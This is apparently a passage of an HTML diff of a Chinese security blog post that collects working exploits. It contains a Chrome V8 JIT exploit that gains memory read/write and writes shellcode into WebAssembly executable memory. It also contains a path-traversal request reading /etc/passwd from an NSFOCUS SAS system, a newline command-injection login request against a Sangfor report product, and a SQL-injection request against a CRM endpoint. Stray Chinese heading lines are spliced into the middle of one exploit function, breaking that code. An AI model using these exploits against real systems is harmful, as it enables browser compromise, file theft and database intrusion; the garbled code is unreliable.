class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">if(typeof alert === &quot;undefined&quot;)&#123;</span><br><span class="line">alert = console.log;</span><br><span class="line">&#125;</span><br><span class="line">let f64 = new Float64Array(1);</span><br><span class="line">let u32 = new Uint32Array(f64.buffer);</span><br><span class="line">function d2u(v) &#123;</span><br><span class="line">f64[0] = v;</span><br><span class="line">return u32;</span><br><span class="line">&#125;</span><br><span class="line">function u2d(lo, hi) &#123;</span><br><span class="line">u32[0] = lo;</span><br><span class="line">u32[1] = hi;</span><br><span class="line">return f64[0];</span><br><span class="line">&#125;</span><br><span class="line">function gc()&#123; // major</span><br><span class="line">for (let i = 0; i &lt; 0x10; i++) &#123;</span><br><span class="line">new Array(0x100000);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">function foo(bug) &#123;</span><br><span class="line">function C(z) &#123;</span><br><span class="line">Error.prepareStackTrace = function(t, B) &#123;</span><br><span class="line">return B[z].getThis();</span><br><span class="line">&#125;;</span><br><span class="line">let p = Error().stack;</span><br><span class="line">Error.prepareStackTrace = null;</span><br><span class="line">return p;</span><br><span class="line">&#125;</span><br><span class="line">function J() &#123;&#125;</span><br><span class="line">var optim = false;</span><br><span class="line">var opt = new Function(</span><br><span class="line">&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;,</span><br><span class="line">&#x27;if(typeof a===\&#x27;number\&#x27;)&#123;if(a&gt;2)&#123;for(var</span><br><span class="line">i=0;i&lt;100;i++);return;&#125;b.d(a,b,1);return&#125;&#x27; +</span><br><span class="line">&#x27;g++;&#x27;.repeat(70));</span><br><span class="line">var e = null;</span><br><span class="line">J.prototype.d = new Function(</span><br><span class="line">&#x27;a&#x27;, &#x27;b&#x27;, &#x27;&quot;use strict&quot;;b.a.call(arguments,b);return arguments[a];&#x27;);</span><br><span class="line">J.prototype.a = new Function(&#x27;a&#x27;, &#x27;a.b(0,a)&#x27;);</span><br><span class="line">J.prototype.b = new Function(</span><br><span class="line">&#x27;a&#x27;, &#x27;b&#x27;,</span><br><span class="line">&#x27;b.c();if(a)&#123;&#x27; +</span><br><span class="line">&#x27;g++;&#x27;.repeat(70) + &#x27;&#125;&#x27;);</span><br><span class="line">J.prototype.c = function() &#123;</span><br><span class="line">if (optim) &#123;</span><br><span class="line">var z = C(3);</span><br><span class="line">var p = C(3);</span><br><span class="line">z[0] = 0;</span><br><span class="line">e = &#123;M: z, C: p&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">var a = new J();</span><br><span class="line">// jit optim</span><br><span class="line">if (bug) &#123;</span><br><span class="line">for (var V = 0; 1E4 &gt; V; V++) &#123;</span><br><span class="line">opt(0 == V % 4 ? 1 : 4, a, 1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">optim = true;</span><br><span class="line">opt(1, a, 1);</span><br><span class="line">return e;</span><br><span class="line">&#125;</span><br><span class="line">e1 = foo(false);</span><br><span class="line">e2 = foo(true);</span><br><span class="line">delete e2.M[0];</span><br><span class="line">let hole = e2.C[0];</span><br><span class="line">let map = new Map();</span><br><span class="line">map.set(&#x27;asd&#x27;, 8);</span><br><span class="line">map.set(hole, 0x8);</span><br><span class="line">map.delete(hole);</span><br><span class="line">map.delete(hole);</span><br><span class="line">map.delete(&quot;asd&quot;);</span><br><span class="line">map.set(0x20, &quot;aaaa&quot;);</span><br><span class="line">let arr3 = new Array(0);</span><br><span class="line">let arr4 = new Array(0);</span><br><span class="line">let arr5 = new Array(1);</span><br><span class="line">let oob_array = [];</span><br><span class="line">oob_array.push(1.1);</span><br><span class="line">map.set(&quot;1&quot;, -1);</span><br><span class="line">let obj_array = &#123;</span><br><span class="line">m: 1337, target: gc</span><br><span class="line">&#125;;</span><br><span class="line">let ab = new ArrayBuffer(1337);</span><br><span class="line">let object_idx = undefined;</span><br><span class="line">let object_idx_flag = undefined;</span><br><span class="line">let max_size = 0x1000;</span><br><span class="line">for (let i = 0; i &lt; max_size; i++) &#123;</span><br><span class="line">if (d2u(oob_array[i])[0] === 0xa72) &#123;</span><br><span class="line">object_idx = i;</span><br><span class="line">object_idx_flag = 1;</span><br><span class="line">break;</span><br><span class="line">&#125;if (d2u(oob_array[i])[1] === 0xa72) &#123;</span><br><span class="line">object_idx = i + 1;</span><br><span class="line">object_idx_flag = 0;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">function addrof(obj_para) &#123;</span><br><span class="line">obj_array.target = obj_para;</span><br><span class="line">let addr = d2u(oob_array[object_idx])[object_idx_flag] - 1;</span><br><span class="line">obj_array.target = gc;</span><br><span class="line">return addr;</span><br><span class="line">&#125;</span><br><span class="line">function fakeobj(addr) &#123;</span><br><span class="line">let r8 = d2u(oob_array[object_idx]);</span><br><span class="line">if (object_idx_flag === 0) &#123;</span><br><span class="line">oob_array[object_idx] = u2d(addr, r8[1]);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">oob_array[object_idx] = u2d(r8[0], addr);</span><br><span class="line">&#125;</span><br><span class="line">return obj_array.target;</span><br><span class="line">&#125;</span><br><span class="line">let bk_idx = undefined;</span><br><span class="line">let bk_idx_flag = undefined;</span><br><span class="line">for (let i = 0; i &lt; max_size; i++) &#123;</span><br><span class="line">if (d2u(oob_array[i])[0] === 1337) &#123;</span><br><span class="line">bk_idx = i;</span><br><span class="line">bk_idx_flag = 1;</span><br><span class="line">break;</span><br><span class="line">&#125;if (d2u(oob_array[i])[1] === 1337) &#123;</span><br><span class="line">bk_idx = i + 1;</span><br><span class="line">bk_idx_flag = 0;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">let dv = new DataView(ab);</span><br><span class="line">function get_32(addr) &#123;</span><br><span class="line">let r8 = d2u(oob_array[bk_idx]);</span><br><span class="line">if (bk_idx_flag === 0) &#123;</span><br><span class="line">oob_array[bk_idx] = u2d(addr, r8[1]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">oob_array[bk_idx] = u2d(r8[0], addr);</span><br><span class="line">&#125;</span><br><span class="line">let val = dv.getUint32(0, true);</span><br><span class="line">oob_array[bk_idx] = u2d(r8[0], r8[1]);</span><br><span class="line">return val;</span><br><span class="line">&#125;</span><br><span class="line">function set_32(addr, val) &#123;</span><br><span class="line">let r8 = d2u(oob_array[bk_idx]);</span><br><span class="line">if (bk_idx_flag === 0) &#123;</span><br><span class="line">oob_array[bk_idx] = u2d(addr, r8[1]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">oob_array[bk_idx] = u2d(r8[0], addr);</span><br><span class="line">&#125;</span><br><span class="line">dv.setUint32(0, val, true);</span><br><span class="line">oob_array[bk_idx] = u2d(r8[0], r8[1]);</span><br><span class="line">&#125;</span><br><span class="line">function write8(addr, val) &#123;</span><br><span class="line">let r8 = d2u(oob_array[bk_idx]);</span><br><span class="line">if (bk_idx_flag === 0) &#123;</span><br><span class="line">oob_array[bk_idx] = u2d(addr, r8[1]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">绿盟sas安全审计系统任意文件读取漏洞</span><br><span class="line">sxf-报表 版本有限制 7.0.8-7.0.8R5</span><br><span class="line">oob_array[bk_idx] = u2d(r8[0], addr);</span><br><span class="line">&#125;</span><br><span class="line">dv.setUint8(0, val);</span><br><span class="line">&#125;</span><br><span class="line">let fake_length = get_32(addrof(oob_array)+12);</span><br><span class="line">set_32(get_32(addrof(oob_array)+8)+4,fake_length);</span><br><span class="line">let wasm_code = new</span><br><span class="line">Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,</span><br><span class="line">128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,</span><br><span class="line">128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0</span><br><span class="line">,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">let wasm_mod = new WebAssembly.Module(wasm_code);</span><br><span class="line">let wasm_instance = new WebAssembly.Instance(wasm_mod);</span><br><span class="line">let f = wasm_instance.exports.main;</span><br><span class="line">let target_addr = addrof(wasm_instance)+0x40;</span><br><span class="line">let rwx_mem = get_32(target_addr);</span><br><span class="line">//alert(&quot;rwx_mem is&quot;+rwx_mem.toString(16));</span><br><span class="line">const shellcode = new Uint8Array([0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,</span><br><span class="line">0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14,</span><br><span class="line">0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,0xac, 0x3c, 0x61, 0x7c,</span><br><span class="line">0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,0x57, 0x8b,</span><br><span class="line">0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01,</span><br><span class="line">0xd1,0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,</span><br><span class="line">0x8b, 0x34, 0x8b,0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,</span><br><span class="line">0x38, 0xe0, 0x75, 0xf6, 0x03,0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58,</span><br><span class="line">0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,</span><br><span class="line">0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,0x24, 0x5b, 0x5b, 0x61,</span><br><span class="line">0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,0x8d, 0x5d,</span><br><span class="line">0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b,</span><br><span class="line">0x6f,0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd,</span><br><span class="line">0x9d, 0xff, 0xd5,0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,</span><br><span class="line">0x47, 0x13, 0x72, 0x6f, 0x6a,0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63,</span><br><span class="line">0x00]);</span><br><span class="line">for(let i=0;i&lt;shellcode.length;i++)&#123;</span><br><span class="line">write8(rwx_mem+i,shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
+if(typeof alert &#x3D;&#x3D;&#x3D; &quot;undefined&quot;)&#123;
+alert &#x3D; console.log;
+&#125;
+let f64 &#x3D; new Float64Array(1);
+let u32 &#x3D; new Uint32Array(f64.buffer);
+function d2u(v) &#123;
+f64[0] &#x3D; v;
+return u32;
+&#125;
+function u2d(lo, hi) &#123;
+u32[0] &#x3D; lo;
+u32[1] &#x3D; hi;
+return f64[0];
+&#125;
+function gc()&#123; &#x2F;&#x2F; major
+for (let i &#x3D; 0; i &lt; 0x10; i++) &#123;
+new Array(0x100000);
+&#125;
+&#125;
+function foo(bug) &#123;
+function C(z) &#123;
+Error.prepareStackTrace &#x3D; function(t, B) &#123;
+return B[z].getThis();
+&#125;;
+let p &#x3D; Error().stack;
+Error.prepareStackTrace &#x3D; null;
+return p;
+&#125;
+function J() &#123;&#125;
+var optim &#x3D; false;
+var opt &#x3D; new Function(
+&#39;a&#39;, &#39;b&#39;, &#39;c&#39;,
+&#39;if(typeof a&#x3D;&#x3D;&#x3D;\&#39;number\&#39;)&#123;if(a&gt;2)&#123;for(var
+i&#x3D;0;i&lt;100;i++);return;&#125;b.d(a,b,1);return&#125;&#39; +
+&#39;g++;&#39;.repeat(70));
+var e &#x3D; null;
+J.prototype.d &#x3D; new Function(
+&#39;a&#39;, &#39;b&#39;, &#39;&quot;use strict&quot;;b.a.call(arguments,b);return arguments[a];&#39;);
+J.prototype.a &#x3D; new Function(&#39;a&#39;, &#39;a.b(0,a)&#39;);
+J.prototype.b &#x3D; new Function(
+&#39;a&#39;, &#39;b&#39;,
+&#39;b.c();if(a)&#123;&#39; +
+&#39;g++;&#39;.repeat(70) + &#39;&#125;&#39;);
+J.prototype.c &#x3D; function() &#123;
+if (optim) &#123;
+var z &#x3D; C(3);
+var p &#x3D; C(3);
+z[0] &#x3D; 0;
+e &#x3D; &#123;M: z, C: p&#125;;
+&#125;
+&#125;;
+var a &#x3D; new J();
+&#x2F;&#x2F; jit optim
+if (bug) &#123;
+for (var V &#x3D; 0; 1E4 &gt; V; V++) &#123;
+opt(0 &#x3D;&#x3D; V % 4 ? 1 : 4, a, 1);
+&#125;
+&#125;
+optim &#x3D; true;
+opt(1, a, 1);
+return e;
+&#125;
+e1 &#x3D; foo(false);
+e2 &#x3D; foo(true);
+delete e2.M[0];
+let hole &#x3D; e2.C[0];
+let map &#x3D; new Map();
+map.set(&#39;asd&#39;, 8);
+map.set(hole, 0x8);
+map.delete(hole);
+map.delete(hole);
+map.delete(&quot;asd&quot;);
+map.set(0x20, &quot;aaaa&quot;);
+let arr3 &#x3D; new Array(0);
+let arr4 &#x3D; new Array(0);
+let arr5 &#x3D; new Array(1);
+let oob_array &#x3D; [];
+oob_array.push(1.1);
+map.set(&quot;1&quot;, -1);
+let obj_array &#x3D; &#123;
+m: 1337, target: gc
+&#125;;
+let ab &#x3D; new ArrayBuffer(1337);
+let object_idx &#x3D; undefined;
+let object_idx_flag &#x3D; undefined;
+let max_size &#x3D; 0x1000;
+for (let i &#x3D; 0; i &lt; max_size; i++) &#123;
+if (d2u(oob_array[i])[0] &#x3D;&#x3D;&#x3D; 0xa72) &#123;
+object_idx &#x3D; i;
+object_idx_flag &#x3D; 1;
+break;
+&#125;if (d2u(oob_array[i])[1] &#x3D;&#x3D;&#x3D; 0xa72) &#123;
+object_idx &#x3D; i + 1;
+object_idx_flag &#x3D; 0;
+break;
+&#125;
+&#125;
+function addrof(obj_para) &#123;
+obj_array.target &#x3D; obj_para;
+let addr &#x3D; d2u(oob_array[object_idx])[object_idx_flag] - 1;
+obj_array.target &#x3D; gc;
+return addr;
+&#125;
+function fakeobj(addr) &#123;
+let r8 &#x3D; d2u(oob_array[object_idx]);
+if (object_idx_flag &#x3D;&#x3D;&#x3D; 0) &#123;
+oob_array[object_idx] &#x3D; u2d(addr, r8[1]);
+&#125;else &#123;
+oob_array[object_idx] &#x3D; u2d(r8[0], addr);
+&#125;
+return obj_array.target;
+&#125;
+let bk_idx &#x3D; undefined;
+let bk_idx_flag &#x3D; undefined;
+for (let i &#x3D; 0; i &lt; max_size; i++) &#123;
+if (d2u(oob_array[i])[0] &#x3D;&#x3D;&#x3D; 1337) &#123;
+bk_idx &#x3D; i;
+bk_idx_flag &#x3D; 1;
+break;
+&#125;if (d2u(oob_array[i])[1] &#x3D;&#x3D;&#x3D; 1337) &#123;
+bk_idx &#x3D; i + 1;
+bk_idx_flag &#x3D; 0;
+break;
+&#125;
+&#125;
+let dv &#x3D; new DataView(ab);
+function get_32(addr) &#123;
+let r8 &#x3D; d2u(oob_array[bk_idx]);
+if (bk_idx_flag &#x3D;&#x3D;&#x3D; 0) &#123;
+oob_array[bk_idx] &#x3D; u2d(addr, r8[1]);
+&#125; else &#123;
+oob_array[bk_idx] &#x3D; u2d(r8[0], addr);
+&#125;
+let val &#x3D; dv.getUint32(0, true);
+oob_array[bk_idx] &#x3D; u2d(r8[0], r8[1]);
+return val;
+&#125;
+function set_32(addr, val) &#123;
+let r8 &#x3D; d2u(oob_array[bk_idx]);
+if (bk_idx_flag &#x3D;&#x3D;&#x3D; 0) &#123;
+oob_array[bk_idx] &#x3D; u2d(addr, r8[1]);
+&#125; else &#123;
+oob_array[bk_idx] &#x3D; u2d(r8[0], addr);
+&#125;
+dv.setUint32(0, val, true);
+oob_array[bk_idx] &#x3D; u2d(r8[0], r8[1]);
+&#125;
+function write8(addr, val) &#123;
+let r8 &#x3D; d2u(oob_array[bk_idx]);
+if (bk_idx_flag &#x3D;&#x3D;&#x3D; 0) &#123;
+oob_array[bk_idx] &#x3D; u2d(addr, r8[1]);
+&#125; else &#123;
+绿盟sas安全审计系统任意文件读取漏洞
+sxf-报表 版本有限制 7.0.8-7.0.8R5
+oob_array[bk_idx] &#x3D; u2d(r8[0], addr);
+&#125;
+dv.setUint8(0, val);
+&#125;
+let fake_length &#x3D; get_32(addrof(oob_array)+12);
+set_32(get_32(addrof(oob_array)+8)+4,fake_length);
+let wasm_code &#x3D; new
+Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,
+128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,
+128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0
+,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+let wasm_mod &#x3D; new WebAssembly.Module(wasm_code);
+let wasm_instance &#x3D; new WebAssembly.Instance(wasm_mod);
+let f &#x3D; wasm_instance.exports.main;
+let target_addr &#x3D; addrof(wasm_instance)+0x40;
+let rwx_mem &#x3D; get_32(target_addr);
+&#x2F;&#x2F;alert(&quot;rwx_mem is&quot;+rwx_mem.toString(16));
+const shellcode &#x3D; new Uint8Array([0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,
+0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14,
+0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,0xac, 0x3c, 0x61, 0x7c,
+0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,0x57, 0x8b,
+0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01,
+0xd1,0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,
+0x8b, 0x34, 0x8b,0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
+0x38, 0xe0, 0x75, 0xf6, 0x03,0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58,
+0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,
+0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,0x24, 0x5b, 0x5b, 0x61,
+0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,0x8d, 0x5d,
+0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b,
+0x6f,0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd,
+0x9d, 0xff, 0xd5,0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
+0x47, 0x13, 0x72, 0x6f, 0x6a,0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63,
+0x00]);
+for(let i&#x3D;0;i&lt;shellcode.length;i++)&#123;
+write8(rwx_mem+i,shellcode[i]);
+&#125;
+f();
+&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-<h2 id="绿盟sas安全审计系统任意文件读取漏洞"><a href="#绿盟sas安全审计系统任意文件读取漏洞" class="headerlink" title="绿盟sas安全审计系统任意文件读取漏洞"></a>绿盟sas安全审计系统任意文件读取漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/webconf/GetFile/indexpath=../../../../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<h2 id="绿盟sas安全审计系统任意文件读取漏洞"><a href="#绿盟sas安全审计系统任意文件读取漏洞" class="headerlink" title="绿盟sas安全审计系统任意文件读取漏洞"></a>绿盟sas安全审计系统任意文件读取漏洞</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;webconf&#x2F;GetFile&#x2F;indexpath&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
-<h2 id="sxf-报表-版本有限制-7-0-8-7-0-8R5"><a href="#sxf-报表-版本有限制-7-0-8-7-0-8R5" class="headerlink" title="sxf-报表 版本有限制 7.0.8-7.0.8R5"></a>sxf-报表 版本有限制 7.0.8-7.0.8R5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /rep/login HTTP/1.1</span><br><span class="line">Host:</span><br><span class="line">Cookie:</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101</span><br><span class="line">Firefox/115.0</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif,</span><br><span class="line">image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2</span><br><span class="line">Accept-Encoding: gzip deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache14</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 126</span><br><span class="line"></span><br><span class="line">clsMode=cls_mode_login&amp;index=index&amp;log_type=report&amp;page=login&amp;rnd=0.7550103466497</span><br><span class="line">915&amp;userID=admin%0Aid -a %0A&amp;userPsw=tmbhuisq</span><br></pre></td></tr></table></figure>
+<h2 id="sxf-报表-版本有限制-7-0-8-7-0-8R5"><a href="#sxf-报表-版本有限制-7-0-8-7-0-8R5" class="headerlink" title="sxf-报表 版本有限制 7.0.8-7.0.8R5"></a>sxf-报表 版本有限制 7.0.8-7.0.8R5</h2><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;rep&#x2F;login HTTP&#x2F;1.1
+Host:
+Cookie:
+User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko&#x2F;20100101
+Firefox&#x2F;115.0
+Accept:text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;g&#x3D;0,9, image&#x2F;avif,
+image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
+Accept-Language:zh-CN, zh;g&#x3D;0.8, zh-TW;g&#x3D;0.7, zh-HK;g&#x3D;0.5,en-US;g&#x3D;0.3,en;g&#x3D;0.2
+Accept-Encoding: gzip deflate
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Pragma: no-cache
+Cache-Control: no-cache14
+Te: trailers
+Connection: close
+Content-Type:application&#x2F;x-www-form-urlencoded
+Content-Length: 126
+
+clsMode&#x3D;cls_mode_login&amp;index&#x3D;index&amp;log_type&#x3D;report&amp;page&#x3D;login&amp;rnd&#x3D;0.7550103466497
+915&amp;userID&#x3D;admin%0Aid -a %0A&amp;userPsw&#x3D;tmbhuisq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 <h2 id="任我行-CRM-sql注入"><a href="#任我行-CRM-sql注入" class="headerlink" title="任我行 CRM sql注入"></a>任我行 CRM sql注入</h2><p>SmsDataList 接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。</p>
 <p><img src="/2023/08/19/1/1.png"> </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /SMS/SmsDataList/?pageIndex=1&amp;pageSize=30 HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 170</span><br><span class="line"></span><br><span class="line">Keywords=&amp;StartSendDate=2023-07-17&amp;EndSendDate=2023-08-10&amp;SenderTypeId=0000000000*</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;SMS&#x2F;SmsDataList&#x2F;?pageIndex&#x3D;1&amp;pageSize&#x3D;30 HTTP&#x2F;1.1
+Host: 
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;57.0.1361.63 Safari&#x2F;537.36
+Accept-Encoding: gzip, deflate
+Accept: *&#x2F;*
+Connection: close
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 170
+
+Keywords&#x3D;&amp;StartSendDate&#x3D;2023-07-17&amp;EndSendDate&#x3D;2023-08-10&amp;SenderTypeId&#x3D;0000000000*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
